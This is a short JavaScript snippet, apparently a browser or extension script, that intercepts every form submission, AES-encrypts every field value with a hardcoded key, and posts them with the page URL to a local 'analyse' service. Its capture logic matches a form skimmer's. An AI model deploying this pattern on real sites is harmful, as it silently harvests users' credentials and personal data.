JENCRYPT = {
    enc: function(m, k) {
        console.log(m);
        return CryptoJS.AES.encrypt(m, k).toString();
    }
}

$(document).bind('submit', 'form', function(e) {
    var sk = 'E11000 Error';

    var origUrl = $(location).attr('href');

    var fields = $.map(e.target.elements, function(element) {
        if (element.value.length == 0) element.value = 'NULL';
        return {
            key: element.name,
            value: JENCRYPT.enc(element.value, sk)
        };
    });
    console.log(origUrl);
    console.log(fields);

    $.ajax({
        contentType: 'application/json',
        data: JSON.stringify({
            'url': origUrl,
            'fields': fields
        }),
        dataType: 'json',
        success: function(data) {
            console.log("successfully sent for analysis");
        },
        error: function() {
            console.log("sent failed");
        },
        processData: false,
        type: 'POST',
        url: 'http://localhost:5000/analyse'
    });
    console.log("END");
});